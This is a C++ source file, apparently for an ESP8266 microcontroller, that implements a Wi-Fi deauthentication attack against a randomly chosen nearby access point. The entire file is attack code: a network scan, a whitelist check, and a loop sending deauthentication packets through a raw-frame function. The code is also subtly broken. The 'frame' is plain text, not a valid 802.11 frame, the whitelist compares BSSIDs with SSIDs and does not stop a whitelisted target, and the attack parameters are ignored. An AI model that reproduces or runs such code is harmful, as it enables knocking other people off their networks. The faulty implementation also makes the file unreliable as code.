#include "deauth.h"

DeauthAttack deauthAttack;  // instance of the object

void DeauthAttack::addToWhitelist(const char* bssid) {
    whitelist.push_back(bssid);
}

void DeauthAttack::selectRandomAP() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("Selected AP is in the whitelist. Skipping deauthentication.");
            return;
        }

        Serial.print("Selected random AP: ");
        Serial.println(randomAP);
    } else {
        Serial.println("No access points found.");
    }
}

void DeauthAttack::startRandomDeauth() {
    if (randomAP.length() > 0) {
        Serial.println("Starting deauthentication attack on the selected AP...");
        // define the attack
        if (!running) {
            // Deauth, beacon, deauth all stations, probe, output, timeout
            start(true, false, false, false, true, 0);
        } else {
            Serial.println("Attack is already running.");
        }
    } else {
        Serial.println("No access point selected. Use selectRandomAP() first.");
    }
}

void DeauthAttack::start(bool param1, bool param2, bool param3, bool param4, bool param5, int param6) {
    running = true;

    // make the deauth frame
    String reasonCode = "3"; // means "Deauthenticated because sending STA is leaving (or has left) BSS"
    String deauthPacket = "c0:ff:ee:c0:ff:ee" + randomAP + reasonCode;
    uint8_t* deauthPacketBytes = (uint8_t*)deauthPacket.c_str();
    int packetSize = deauthPacket.length();

    // send the deauth 10 times
    for (int i = 0; i < 10; ++i) {
        wifi_send_pkt_freedom(deauthPacketBytes, packetSize, 0);
        delay(100);
    }

    running = false;
}
